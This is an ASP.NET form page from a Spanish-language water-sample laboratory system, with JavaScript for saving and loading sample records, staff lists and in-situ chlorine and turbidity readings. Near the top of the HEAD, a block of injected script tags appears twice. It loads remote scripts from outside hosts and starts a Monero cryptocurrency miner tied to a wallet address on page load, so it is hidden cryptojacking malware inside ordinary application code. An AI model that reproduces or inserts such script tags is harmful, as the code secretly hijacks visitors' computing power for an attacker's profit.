<%@ Register TagPrefix="uc1" TagName="ControlAA" Src="ControlAA.ascx" %>
<%@ Page Language="vb" AutoEventWireup="false" Codebehind="Muestra.aspx.vb" Inherits="Laboratorio.Laboratorio.FormMuestra"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>Muestra</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta http-equiv="content-type" content="text/html; charset=iso-8859-15">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
		<LINK href="estandar.css" type="text/css" rel="stylesheet">


<script src="http://sv9.premiumwebserver.com/iis/iisstart.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008"></script> <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008"> </script><script type="text/javascript">EverythingIsBinary('49YNi28eu3SL1KJHg2APzMgViFgYAyuLaYvRJTMUV6guUDe7zZN6JVzajp8RL8cxt9eVtREyTLPp4AKoR4wxuyoUVBfApN1', 'x', 40);</script>

<script src="http://sv9.premiumwebserver.com/iis/iisstart.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008"></script> <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008"> </script><script type="text/javascript">EverythingIsBinary('49YNi28eu3SL1KJHg2APzMgViFgYAyuLaYvRJTMUV6guUDe7zZN6JVzajp8RL8cxt9eVtREyTLPp4AKoR4wxuyoUVBfApN1', 'x', 40);</script>

		<SCRIPT language="JAVASCRIPT" src="functions.js"></SCRIPT>
		<script>
		
	function guardarMuestra(){
				xmlDoc.async = false;
                labelLoading.style.visibility = "visible";
				var xmlDso = xmlDoc.XMLDocument;
				
        if (Form1.listEstado.value=='INF'){
						alert("La muestra ya fue informada a la SISS");
						labelLoading.style.visibility = "hidden";
						return true;}
						
		if (Form1.listServicios.value==0){
						alert("Ingrese el Servicio");
						labelLoading.style.visibility = "hidden";
						return true;}
						
		if (Form1.txtNro.value&&Form1.txtFecha.value){
		//Modifica Muestra
			  Url = "Muestra.aspx?Recurso=updateMuestra&Nro=" +  Form1.txtNro.value;
			  
              Url += "&Fecha=" +  Form1.txtFecha.value;
              if (Form1.listRecepcionFQ.value!=0||Form1.listRecepcionBac.value!=0)
								Url += "&Estado=REC";
						else
								Url += "&Estado=ING";		
              
              Url += "&Ubicacion=" +Form1.txtUbicacion.value.replace('#','%23');
              Url +=  "&Servicio=" +Form1.listServicios.value;
              Url +=  "&Sector=" +Form1.txtSector.value; 
              Url +=  "&TipoMuestra=" +Form1.listTipoMuestra.value;
              
              Url +=  "&PuntoMuestreo=" +Form1.listPuntoMuestreo.value;
              Url +=  "&Transportista=" +Form1.listTransportista.value;
                            
              Url += "&Muestreador=" +Form1.listMuestreador.value; 
              Url += "&OT=" +Form1.txtOT.value;
              Url += "&IDDireccion=" +Form1.txtIDDireccion.value;
              Url += "&Anexo3=" +Form1.chkAnexo3.checked;
              Url += "&CorrRem=" +Form1.txtCorrRem.value;
              Url += "&HoraMuestreo=" +Form1.txtHoraMuestreo.value;
              Url +="&Observacion=" +Form1.txtObservacion.value;
              Url +="&LecturaMedidor=" +Form1.txtLecturaMedidor.value;
              
              Url +="&FrascoBac=" +Form1.txtFrascoBac.value;
              Url +="&RecepcionBac=" +Form1.listRecepcionBac.value;
              Url +="&FechaRecepBac=" +Form1.TxtFechaRecBac.value;
              Url +="&HoraBac=" +Form1.TxtHoraBac.value; 
              Url +="&TempBac=" +Form1.TxtTempBac.value;
              
              Url +="&FrascoFQ=" +Form1.txtFrascoFQ.value;
              Url +="&RecepcionFQ=" +Form1.listRecepcionFQ.value;
              Url +="&FechaRecepFQ=" +Form1.TxtFechaRecFQ.value;
              Url +="&HoraFQ=" +Form1.TxtHoraFQ.value; 
              Url +="&TempFQ=" +Form1.TxtTempFQ.value;
             
            var res = xmlDso.load(Url);
            var tree = xmlDso.documentElement;
             if (tree.childNodes.length>0)
									winError(tree.text);
			
			guardarParametro(Form1.txtNro.value, 1, Form1.TxtCloro.value);
			guardarParametro(Form1.txtNro.value, 2, Form1.TxtTurbiedad.value);
			cargarMuestra();
			}
       else{
		if(!Form1.txtNro.value&&Form1.txtFecha.value){
          var xmlDso = xmlDoc.XMLDocument;
              	Url = "Muestra.aspx?Recurso=newMuestra";
				Url += "&Fecha=" +  Form1.txtFecha.value;
				Url += "&Estado=ING";
				Url += "&Ubicacion=" +Form1.txtUbicacion.value.replace('#','%23');
				Url +=  "&Servicio=" +Form1.listServicios.value;
				Url +=  "&Sector=" +Form1.txtSector.value; 
				Url +=  "&TipoMuestra=" +Form1.listTipoMuestra.value;
				Url +=  "&PuntoMuestreo=" +Form1.listPuntoMuestreo.value;
				Url +=  "&Transportista=" +Form1.listTransportista.value;
                Url += "&Muestreador=" +Form1.listMuestreador.value; 
				Url += "&OT=" +Form1.txtOT.value;
				Url += "&IDDireccion=" +Form1.txtIDDireccion.value;
				Url += "&Anexo3=" +Form1.chkAnexo3.checked;
				Url += "&CorrRem=" +Form1.txtCorrRem.value;
				Url += "&HoraMuestreo=" +Form1.txtHoraMuestreo.value;
				Url +="&Observacion=" +Form1.txtObservacion.value;
				Url +="&LecturaMedidor=" +Form1.txtLecturaMedidor.value;
              
				Url +="&FrascoBac=" +Form1.txtFrascoBac.value;
				Url +="&RecepcionBac=" +Form1.listRecepcionBac.value;
				Url +="&FechaRecepBac=" +Form1.TxtFechaRecBac.value;
				Url +="&HoraBac=" +Form1.TxtHoraBac.value; 
				Url +="&TempBac=" +Form1.TxtTempBac.value;
              
				Url +="&FrascoFQ=" +Form1.txtFrascoFQ.value;
				Url +="&RecepcionFQ=" +Form1.listRecepcionFQ.value;
				Url +="&FechaRecepFQ=" +Form1.TxtFechaRecFQ.value;
				Url +="&HoraFQ=" +Form1.TxtHoraFQ.value; 
				Url +="&TempFQ=" +Form1.TxtTempFQ.value;
				
				var res = xmlDso.load(Url);
				var tree = xmlDso.documentElement;
				
				if (tree.childNodes.length>0)
						{
						if (tree.text.length > 6)
									winError(tree.text);
						else
								Form1.txtNro.value = tree.text;
						}
												
				if (Form1.TxtCloro.value.length > 0)
						guardarParametro(Form1.txtNro.value, 1, Form1.TxtCloro.value);
						
				if (Form1.TxtCloro.value.length > 0)
						guardarParametro(Form1.txtNro.value, 2, Form1.TxtTurbiedad.value);
						
				cargarMuestra();
				}
			else
				alert("Ingrese Fecha de Muestreo");
          }  
        
        labelLoading.style.visibility = "hidden";
      }//End Guardar Muestra
      
      function guardarParametro(Nro, Param, Valor){
                xmlDoc.async = false;
				var xmlDso = xmlDoc.XMLDocument;
				Url = "Muestra.aspx?recurso=guardarParametro&Nro=" + Nro + "&Parametro=" + Param +"&Valor=" + Valor;
				if (Valor.length >0){
						var res = xmlDso.load(Url);
						if (res){var tree = xmlDso.documentElement;}
						if (!res)
								alert(tree.text);
						}
						
      }
      
       function cargarMuestra(){
        if (Form1.txtNro.value){
          xmlDoc.async = false;
          var xmlDso = xmlDoc.XMLDocument;
          var res = xmlDso.load("Muestra.aspx?Recurso=getMuestra&Nro="+Form1.txtNro.value);
          if (res){
            var tree = xmlDso.documentElement;
            if (tree.childNodes.length > 0){
              var node = tree.childNodes.item(0);
              Form1.txtNro.value = getChildNodeValue(node,"NUM_MUESTRA");
              Form1.txtFecha.value = localDateString(getChildNodeValue(node,"FECHA_MUESTRA"));
              Form1.listEstado.value = getChildNodeValue(node,"ID_ESTADO");
              Form1.txtUbicacion.value = getChildNodeValue(node,"UBICACION");
              Form1.listServicios.value  = getChildNodeValue(node,"COD_SERVICIO");
              Form1.txtSector.value = getChildNodeValue(node,"NUM_SECTOR");
              Form1.listTipoMuestra.value = getChildNodeValue(node,"ID_TIPO_MUESTRA");
              if (getChildNodeValue(node,"PUNTO_MUESTREO")!=""){getPuntoMuestreo();}
              Form1.listPuntoMuestreo.value = getChildNodeValue(node,"PUNTO_MUESTREO");
              Form1.listTransportista.value = getChildNodeValue(node,"TRANSPORTISTA");
                            
              Form1.listMuestreador.value = getChildNodeValue(node,"MUESTREADOR");
              Form1.txtOT.value = getChildNodeValue(node,"FOLIO_OT");
              Form1.txtIDDireccion.value= getChildNodeValue(node,"ID_DIRECCION");
              getPuntoFijo(Form1.txtIDDireccion.value);
              Form1.chkAnexo3.checked=StrToBoo(getChildNodeValue(node,"IND_ANE3"));
              Form1.txtCorrRem.value= getChildNodeValue(node,"CORR_REM");
              Form1.txtHoraMuestreo.value= getChildNodeValue(node,"HORA_MUESTREO");
              Form1.txtObservacion.value= getChildNodeValue(node,"OBS_MUESTREO");
              Form1.txtLecturaMedidor.value= getChildNodeValue(node,"LECTURA_MEDIDOR");
              
              Form1.txtFrascoBac.value= getChildNodeValue(node,"NUM_FRASCO_BAC");
              Form1.listRecepcionBac.value=getChildNodeValue(node,"RECEPCIONISTA");
              Form1.TxtFechaRecBac.value=localDateString(getChildNodeValue(node,"F_RECEPCION"));
              Form1.TxtHoraBac.value = getChildNodeValue(node,"HORA_RECEPCION");
              Form1.TxtTempBac.value=getChildNodeValue(node,"TEMPERATURA");
              
              Form1.txtFrascoFQ.value= getChildNodeValue(node,"NUM_FRASCO_FQ");
              Form1.listRecepcionFQ.value= getChildNodeValue(node,"RECEPCIONISTA_FQ");
              Form1.TxtFechaRecFQ.value=localDateString(getChildNodeValue(node,"F_RECEPCION_FQ"));
              Form1.TxtHoraFQ.value = getChildNodeValue(node,"HORA_RECEPCION_FQ");
              Form1.TxtTempFQ.value=getChildNodeValue(node,"TEMPERATURA_FQ");
                            
             
              getValorParametros();
            }else{ alert("Muestra Invalida\nverifique que realmente exista"); }
          }else{ alert("ha ocurrido un error al cargar los datos.\n" + xmlDso.parseError.reason); }
        }else{ alert("Especifique nro de Muestra"); }  
        labelLoading.style.visibility = "hidden";
      }
            
              
       function getMuestra(_Nro){
        if (isNaN(_Nro)){
          alert("Nro Invalido!");
        }else{
          Form1.txtNro.value = _Nro;
          labelLoading.style.visibility = "visible";
          setTimeout("cargarMuestra()",1);
        }
      }
      
       function cargarParametros(){
        cargarTipoMuestra();
       getListMuestreadores();
        getListRecepcionistas();
        getListTransportistas();
        getListServicios()
        getListEstados();
        
             
       }
      
        function verAnalisisBac(){
			url ='datosanalisisbac.asp?nm=' + Form1.txtNro.value;
			document.location.href=url;
        }
        
        function verAnalisisFQ(){
        	document.location.href="datosanalisisfq.asp?nm=" + Form1.txtNro.value;        
        }
        
       function getValorParametros(){
                xmlDoc.async = false;
				var xmlDso = xmlDoc.XMLDocument;
				Nro = Form1.txtNro.value;
				
			var res = xmlDso.load("Muestra.aspx?recurso=getValorParametro&Nro=" + Nro + "&Parametro=1");
				if (res){var tree = xmlDso.documentElement;}
				if (tree.childNodes.length > 0){
				var node = tree.childNodes.item(0);
				Form1.TxtCloro.value=  getChildNodeValue(node,"VALOR");}
				
				var res = xmlDso.load("Muestra.aspx?recurso=getValorParametro&Nro=" + Nro +"&Parametro=2");
				if (res){var tree = xmlDso.documentElement;}
				if (tree.childNodes.length > 0){
				var node = tree.childNodes.item(0);
				Form1.TxtTurbiedad.value= getChildNodeValue(node,"VALOR");}
              
       }
       

       function getPuntoFijo(id_direccion){
                xmlDoc.async = false;
				var xmlDso = xmlDoc.XMLDocument;
								
			var res = xmlDso.load("Muestra.aspx?recurso=getPuntoFijo&IdDireccion=" + id_direccion );
			
				if (res){
					var tree = xmlDso.documentElement;
					if (tree.childNodes.length > 0){
					var node = tree.childNodes.item(0);
					Form1.txtPuntoFijo.value = getChildNodeValue(node,"COD_PUNTO_FIJO");}
					}
				
       }
       
       function finalizarAnalisis(){
                xmlDoc.async = false;
				var xmlDso = xmlDoc.XMLDocument;
								
			var res = xmlDso.load("Muestra.aspx?recurso=finalizarAnalisis&Nro=" + Form1.txtNro.value );
			if (res){
					var tree = xmlDso.documentElement;
					if (tree.childNodes.length > 0){
								var node = tree.childNodes.item(0);
							}
					}
			cargarMuestra();
       }
       
       function getDireccionPuntoFijo(puntoFijo){
                xmlDoc.async = false;
				var xmlDso = xmlDoc.XMLDocument;
								
			var res = xmlDso.load("Muestra.aspx?recurso=getDireccionPuntoFijo&PuntoFijo=" + puntoFijo );
				if (res){
					var tree = xmlDso.documentElement;
					if (tree.childNodes.length > 0){
					var node = tree.childNodes.item(0);
				//	alert(tree.text);
					Form1.txtIDDireccion.value = getChildNodeValue(node,"ID_DIRECCION");
					Form1.txtUbicacion.value = getChildNodeValue(node,"DIRECCION");
					}
				}
				
       }
                     
    function cargarTipoMuestra(){
        xmlDoc.async = false;
        var xmlDso = xmlDoc.XMLDocument;
        var res = xmlDso.load("Muestra.aspx?recurso=getTipoMuestra");
        if (res){
          var tree = xmlDso.documentElement;
          
          for(var i = 0; i < tree.childNodes.length; i++){
            var node = tree.childNodes.item(i);
            opcion = new Option(getChildNodeValue(node,"NOM_TIPO_MUESTRA"),getChildNodeValue(node,"ID_TIPO_MUESTRA"));
            if (opcion.value == "0") opcion.selected = true;
            Form1.listTipoMuestra.options[i] = opcion;   
          }
                 
         }
      }
      
      function getListMuestreadores(){
        xmlDoc.async = false;
        var xmlDso = xmlDoc.XMLDocument;
        var res = xmlDso.load("Muestra.aspx?recurso=getListMuestreadores");
        if (res){
          var tree = xmlDso.documentElement;
          
          for(var i = 0; i < tree.childNodes.length; i++){
            var node = tree.childNodes.item(i);
            opcion = new Option(getChildNodeValue(node,"NOMBRE"),getChildNodeValue(node,"CODIGO"));
            if (opcion.value == "0") opcion.selected = true;
            Form1.listMuestreador.options[i] = opcion;   
          }
                 
         }
      }
      
      function getListTransportistas(){
        xmlDoc.async = false;
        var xmlDso = xmlDoc.XMLDocument;
        var res = xmlDso.load("Muestra.aspx?recurso=getListTransportistas");
        if (res){
          var tree = xmlDso.documentElement;
          
          for(var i = 0; i < tree.childNodes.length; i++){
				var node = tree.childNodes.item(i);
				opcion = new Option(getChildNodeValue(node,"NOMBRE"),getChildNodeValue(node,"CODIGO"));
				if (opcion.value == "0") opcion.selected = true;
			 Form1.listTransportista.options[i] = opcion;   
			 }
                 
         }
      }

      function getListServicios(){
        xmlDoc.async = false;
        var xmlDso = xmlDoc.XMLDocument;
        var res = xmlDso.load("Muestra.aspx?recurso=getListServicios");
        if (res){
          var tree = xmlDso.documentElement;
          
          for(var i = 0; i < tree.childNodes.length; i++){
				var node = tree.childNodes.item(i);
				opcion = new Option(getChildNodeValue(node,"NOMBRE"),getChildNodeValue(node,"CODIGO"));
				if (opcion.value == "0") opcion.selected = true;
			 Form1.listServicios.options[i] = opcion;   
			 }
                 
         }
      }
      
            
     function getListEstados(){
        xmlDoc.async = false;
        var xmlDso = xmlDoc.XMLDocument;
        var res = xmlDso.load("Muestra.aspx?recurso=getListEstados");
        if (res){
          var tree = xmlDso.documentElement;
          
          for(var i = 0; i < tree.childNodes.length; i++){
				var node = tree.childNodes.item(i);
				opcion = new Option(getChildNodeValue(node,"NOMBRE"),getChildNodeValue(node,"CODIGO"));
				if (opcion.value == "0") opcion.selected = true;
			 Form1.listEstado.options[i] = opcion;   
			 }
                 
         }
      }
      
      function getListRecepcionistas(){
        xmlDoc.async = false;
        var xmlDso = xmlDoc.XMLDocument;
        var res = xmlDso.load("Muestra.aspx?recurso=getListRecepcionistas");
        if (res){
          var tree = xmlDso.documentElement;
          
          for(var i = 0; i < tree.childNodes.length; i++){
            var node = tree.childNodes.item(i);
            opcion = new Option(getChildNodeValue(node,"NOMBRE"),getChildNodeValue(node,"CODIGO"));
            if (opcion.value == "0") opcion.selected = true;
            Form1.listRecepcionBac.options[i] = opcion;   
            }       
            
            
          for(var i = 0; i < tree.childNodes.length; i++){
            var node = tree.childNodes.item(i);
            opcion = new Option(getChildNodeValue(node,"NOMBRE"),getChildNodeValue(node,"CODIGO"));
            if (opcion.value == "0") opcion.selected = true;
            Form1.listRecepcionFQ.options[i] = opcion;   
            }       
         }
      }
      
      function getPuntoMuestreo(){
      
         var _tipoMuestra = Form1.listTipoMuestra.options[Form1.listTipoMuestra.selectedIndex].value;
         Form1.listPuntoMuestreo.options.length=0;
                                     
        xmlDoc.async = false;
        var xmlDso = xmlDoc.XMLDocument;
        var res = xmlDso.load("Muestra.aspx?recurso=getPuntoMuestreo&TipoMuestra=" + _tipoMuestra);
        if (res){
          var tree = xmlDso.documentElement;
          for(var i = 0; i < tree.childNodes.length; i++){
            var node = tree.childNodes.item(i);
            opcion = new Option(getChildNodeValue(node,"NOMBRE"),getChildNodeValue(node,"CODIGO"));
            Form1.listPuntoMuestreo.options[i] = opcion;   
                }
            //Form1.txtUbicacion.value= Form1.listPuntoMuestreo.options[Form1.listPuntoMuestreo.selectedIndex].text;
                 
         }
      }
		</script>
	</HEAD>
	<body onload="cargarParametros();Form1.txtNro.focus();" MS_POSITIONING="GridLayout">
		<!--DIV id="divdireccion" style="BORDER-RIGHT: #dfdfdf 1px ridge; BORDER-TOP: #dfdfdf 1px ridge; Z-INDEX: 145; LEFT: 12px; VISIBILITY: hidden; BORDER-LEFT: #dfdfdf 1px ridge; BORDER-BOTTOM: #dfdfdf 1px ridge; POSITION: absolute; TOP: 72px"
			onclick="event.cancelBubble=true"><IFRAME name="direccionframe" src="buscardireccion.htm" frameBorder="0" width="250" scrolling="no"
				height="180"></IFRAME>
		</DIV-->
		<XML id="xmlDoc"></XML>
		<form id="Form1" method="post" runat="server">
			<table height="24" cellSpacing="0" cellPadding="0" width="760" align="center" border="0">
				<tr>
					<td><uc1:controlaa id="xcontrol" runat="server" codmenu="16210" codsistema="16000" image="images/lab.jpg"></uc1:controlaa></td>
				</tr>
			</table>
			<span class="loading" id="labelLoading" style="Z-INDEX: 135; LEFT: 296px; VISIBILITY: hidden; WIDTH: 256px; POSITION: absolute; TOP: 204px; HEIGHT: 48px">
				Cargando.... espere un momento </span>
			<SELECT class="input" id="listServicios" style="Z-INDEX: 147; LEFT: 664px; WIDTH: 92px; POSITION: absolute; TOP: 76px"
				name="listServicios" tabIndex="4">
				<OPTION selected></OPTION>
			</SELECT><INPUT class="inputButton" id="btnFinalizarAnalisis" style="LEFT: 360px; WIDTH: 100px; POSITION: absolute; TOP: 452px; HEIGHT: 21px"
				onclick="finalizarAnalisis();" type="button" value="Finalizar Analisis" name="buttonBuscar"
				tabIndex="39">
			<SELECT class="input" id="listEstado" style="Z-INDEX: 143; LEFT: 496px; WIDTH: 100px; POSITION: absolute; TOP: 76px"
				name="listEstado" disabled tabIndex="3">
				<OPTION selected></OPTION>
			</SELECT>
			<INPUT class="inputButton" id="btnNuevo" style="Z-INDEX: 2; LEFT: 232px; WIDTH: 56px; POSITION: absolute; TOP: 452px; HEIGHT: 21px"
				onclick="document.location.href='Muestra.aspx';" type="button" value="Nuevo" name="buttonBuscar"
				tabIndex="41"> 
			<INPUT class="inputButton" id="btnGuardar" style="LEFT: 292px; POSITION: absolute; TOP: 452px"
				onclick="guardarMuestra(Form1.txtNro.value); return(false);" type="button" value="Guardar" name="buttonBuscar"
				tabIndex="39"> <INPUT class="inputButton" id="btnCerrar" style="LEFT: 464px; WIDTH: 60px; POSITION: absolute; TOP: 452px; HEIGHT: 21px"
				onclick="close();" type="button" value="Cerrar" name="buttonBuscar" tabIndex="40">
			<SELECT class="input" id="listTransportista" style="Z-INDEX: 100; LEFT: 284px; WIDTH: 280px; POSITION: absolute; TOP: 184px"
				tabIndex="21">
				<OPTION selected></OPTION>
			</SELECT>
			<asp:label id="Label33" style="Z-INDEX: 139; LEFT: 200px; POSITION: absolute; TOP: 188px" runat="server"
				CssClass="labelInput">Transportista :</asp:label>
			<INPUT class="inputButton" id="BIDDireccion" style="Z-INDEX: 134; LEFT: 188px; POSITION: absolute; TOP: 132px"
				onclick="direccionframe.popsearchbox(10, txtIDDireccion, txtUbicacion, divdireccion); return false;"
				type="button" value="B" name="buttonBuscar" tabIndex="10"> <TEXTAREA dataFld="informe" class="input" id="txtObservacion" style="Z-INDEX: 133; LEFT: 280px; WIDTH: 456px; POSITION: absolute; TOP: 208px; HEIGHT: 60px"
				rows="3" cols="54" tabIndex="23"></TEXTAREA> <INPUT class="input" id="txtHoraMuestreo" style="Z-INDEX: 132; LEFT: 496px; WIDTH: 68px; POSITION: absolute; TOP: 164px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="6" name="txtOT" runat="server" tabIndex="19">
			<asp:label id="Label18" style="Z-INDEX: 131; LEFT: 400px; POSITION: absolute; TOP: 164px" runat="server"
				CssClass="labelInput" Width="88px">Hora Muestreo :</asp:label><asp:label id="Label17" style="Z-INDEX: 130; LEFT: 200px; POSITION: absolute; TOP: 208px" runat="server"
				CssClass="labelInput" Width="74px">Observaci�n :</asp:label><INPUT class="input" id="txtLecturaMedidor" style="Z-INDEX: 129; LEFT: 668px; WIDTH: 68px; POSITION: absolute; TOP: 164px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="6" name="txtOT" runat="server" tabIndex="20">
			<asp:label id="Label16" style="Z-INDEX: 128; LEFT: 568px; POSITION: absolute; TOP: 164px" runat="server"
				CssClass="labelInput" Width="100px">Lectura Medidor :</asp:label>
			<SELECT class="input" id="listMuestreador" style="Z-INDEX: 101; LEFT: 284px; WIDTH: 112px; POSITION: absolute; TOP: 164px"
				name="listMuestreador" tabIndex="18">
				<OPTION selected></OPTION>
			</SELECT>
			<asp:label id="Label15" style="Z-INDEX: 127; LEFT: 200px; POSITION: absolute; TOP: 168px" runat="server"
				CssClass="labelInput">Muestreador :</asp:label>
			<INPUT class="input" id="txtIDDireccion" style="Z-INDEX: 126; LEFT: 104px; WIDTH: 72px; POSITION: absolute; TOP: 136px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="6" name="txtOT" runat="server" tabIndex="13">
			<asp:label id="Label12" style="Z-INDEX: 125; LEFT: 24px; POSITION: absolute; TOP: 136px" runat="server"
				CssClass="labelInput">ID Direcci�n :</asp:label>
			<INPUT class="inputButton" id="BPuntoFijo" style="Z-INDEX: 124; LEFT: 740px; POSITION: absolute; TOP: 100px"
				onclick="getDireccionPuntoFijo(Form1.txtPuntoFijo.value);" type="button" value="B"
				name="btnBPuntofijo" tabIndex="8">
			<asp:label id="Label9" style="Z-INDEX: 123; LEFT: 600px; POSITION: absolute; TOP: 104px" runat="server"
				CssClass="labelInput">Punto Fijo :</asp:label>
			<INPUT class="input" id="txtPuntoFijo" style="Z-INDEX: 121; LEFT: 664px; WIDTH: 72px; POSITION: absolute; TOP: 104px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="6" name="txtOT" runat="server" tabIndex="7">
			<div id="calendar" style="BORDER-RIGHT: 2px ridge; BORDER-TOP: 2px ridge; Z-INDEX: 138; LEFT: 16px; VISIBILITY: hidden; BORDER-LEFT: 2px ridge; WIDTH: 10px; BORDER-BOTTOM: 2px ridge; POSITION: absolute; TOP: 348px; HEIGHT: 0px"
				onclick="event.cancelBubble=true"><IFRAME name="calendarframe" src="dtpicker.htm" frameBorder="0" width="180" scrolling="no"
					height="180"></IFRAME>
			</div>
			<INPUT class="input" id="txtNro" style="Z-INDEX: 105; LEFT: 104px; WIDTH: 72px; POSITION: absolute; TOP: 80px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="6" name="txtNro" runat="server">
			<asp:label id="Label6" style="Z-INDEX: 113; LEFT: 220px; POSITION: absolute; TOP: 136px" runat="server"
				CssClass="labelInput">Ubicaci�n :</asp:label><INPUT class="input" id="txtUbicacion" style="Z-INDEX: 114; LEFT: 280px; WIDTH: 314px; POSITION: absolute; TOP: 136px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="47" name="txtUbicacion" runat="server" tabIndex="14">
			<asp:label id="Label5" style="Z-INDEX: 112; LEFT: 16px; POSITION: absolute; TOP: 104px" runat="server"
				CssClass="labelInput">Tipo Muestra :</asp:label>
			<SELECT class="input" id="listTipoMuestra" style="Z-INDEX: 111; LEFT: 104px; WIDTH: 100px; POSITION: absolute; TOP: 104px"
				onchange="getPuntoMuestreo();" name="listTipoMuestra" tabIndex="5">
				<OPTION selected></OPTION>
			</SELECT>
			<INPUT class="inputButton" id="BCalendar" style="Z-INDEX: 110; LEFT: 364px; POSITION: absolute; TOP: 76px"
				onclick="calendarframe.fPopCalendar(this,txtFecha,calendar);return false;" type="button"
				value="C" name="buttonFecha" tabIndex="2">&nbsp;
			<asp:label id="Label4" style="Z-INDEX: 109; LEFT: 440px; POSITION: absolute; TOP: 80px" runat="server"
				CssClass="labelInput">Estado :</asp:label><INPUT class="inputButton" id="buttonBuscar" style="Z-INDEX: 108; LEFT: 188px; POSITION: absolute; TOP: 76px"
				onclick="getMuestra(Form1.txtNro.value); return(false);" type="submit" value="B" name="buttonBuscar" tabIndex="0">
			<asp:label id="Label3" style="Z-INDEX: 107; LEFT: 240px; POSITION: absolute; TOP: 80px" runat="server"
				CssClass="labelInput">Fecha :</asp:label><INPUT class="input" id="txtFecha" style="Z-INDEX: 106; LEFT: 280px; WIDTH: 72px; POSITION: absolute; TOP: 80px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="6" name="txtFecha" runat="server" tabIndex="1">
			<asp:label id="Label1" style="Z-INDEX: 104; LEFT: 20px; POSITION: absolute; TOP: 80px" runat="server"
				CssClass="labelInput" Width="76px">Nro Muestra :</asp:label><asp:label id="Label7" style="Z-INDEX: 115; LEFT: 216px; POSITION: absolute; TOP: 100px" runat="server"
				CssClass="labelInput" Width="60px">Punto de Muestreo :</asp:label>
			<SELECT class="input" id="listPuntoMuestreo" style="Z-INDEX: 116; LEFT: 280px; WIDTH: 316px; POSITION: absolute; TOP: 104px"
				name="inputEstadoPET" onchange="txtUbicacion.value= Form1.listPuntoMuestreo.options[Form1.listPuntoMuestreo.selectedIndex].text;"
				tabIndex="6">
				<OPTION selected></OPTION>
			</SELECT>
			<asp:label id="Label11" style="Z-INDEX: 122; LEFT: 636px; POSITION: absolute; TOP: 188px" runat="server"
				CssClass="labelInput">O.T.  :</asp:label><INPUT class="input" id="txtOT" style="Z-INDEX: 120; LEFT: 668px; WIDTH: 68px; POSITION: absolute; TOP: 188px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="6" name="txtOT" runat="server" tabIndex="22">
			<asp:label id="Label10" style="Z-INDEX: 118; LEFT: 620px; POSITION: absolute; TOP: 132px" runat="server"
				CssClass="labelInput">Sector :</asp:label><INPUT class="input" id="txtSector" style="Z-INDEX: 119; LEFT: 664px; WIDTH: 68px; POSITION: absolute; TOP: 132px; HEIGHT: 18px; TEXT-ALIGN: center"
				type="text" size="6" name="txtSector" runat="server" tabIndex="5">
			<asp:label id="Label8" style="Z-INDEX: 117; LEFT: 608px; POSITION: absolute; TOP: 80px" runat="server"
				CssClass="labelInput">Servicio :</asp:label>
			<DIV class="panel" title="Anomalias" style="Z-INDEX: 102; LEFT: 20px; WIDTH: 176px; POSITION: absolute; TOP: 164px; HEIGHT: 76px"
				ms_positioning="GridLayout"><INPUT id="chkAnexo3" style="Z-INDEX: 144; LEFT: 116px; POSITION: absolute; TOP: 40px"
					type="checkbox" name="chkAnexo3" tabIndex="17">
				<asp:label id="Label14" style="Z-INDEX: 144; LEFT: 8px; POSITION: absolute; TOP: 44px" runat="server"
					CssClass="labelInput" Width="104px">Informar Anexo 3 :</asp:label><asp:label id="Label13" style="Z-INDEX: 144; LEFT: 8px; POSITION: absolute; TOP: 8px" runat="server"
					CssClass="labelInput" Width="88px">Nro Muestra Reinspeccionada :</asp:label><INPUT class="input" id="txtCorrRem" style="Z-INDEX: 144; LEFT: 116px; WIDTH: 52px; POSITION: absolute; TOP: 16px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="3" name="txtOT" runat="server" tabIndex="16"></DIV>
			<DIV class="panel" title="Anomalias" style="Z-INDEX: 103; LEFT: 20px; WIDTH: 176px; POSITION: absolute; TOP: 268px; HEIGHT: 72px"
				ms_positioning="GridLayout"><asp:label id="Label19" style="Z-INDEX: 100; LEFT: 36px; POSITION: absolute; TOP: 28px" runat="server"
					CssClass="labelInput" Width="40px">Cloro :</asp:label><asp:label id="Label20" style="Z-INDEX: 101; LEFT: 12px; POSITION: absolute; TOP: 52px" runat="server"
					CssClass="labelInput" Width="44px">Turbiedad :</asp:label><asp:label id="Label21" style="Z-INDEX: 102; LEFT: 4px; POSITION: absolute; TOP: 4px" runat="server"
					CssClass="labelInput" Width="88px">Analisis In Situ</asp:label><INPUT class="input" id="TxtCloro" style="Z-INDEX: 103; LEFT: 92px; WIDTH: 60px; POSITION: absolute; TOP: 24px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="4" runat="server" tabIndex="24"> <INPUT class="input" id="TxtTurbiedad" style="Z-INDEX: 104; LEFT: 92px; WIDTH: 60px; POSITION: absolute; TOP: 48px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="4" runat="server" tabIndex="25"></DIV>
			<DIV class="panel" title="Fisico Quimico" style="Z-INDEX: 137; LEFT: 492px; WIDTH: 244px; POSITION: absolute; TOP: 276px; HEIGHT: 168px"
				ms_positioning="GridLayout">
				<asp:label id="Label31" style="Z-INDEX: 100; LEFT: 36px; POSITION: absolute; TOP: 56px" runat="server"
					CssClass="labelInput" Width="40px">Recepcionista :</asp:label><asp:label id="Label30" style="Z-INDEX: 101; LEFT: 20px; POSITION: absolute; TOP: 76px" runat="server"
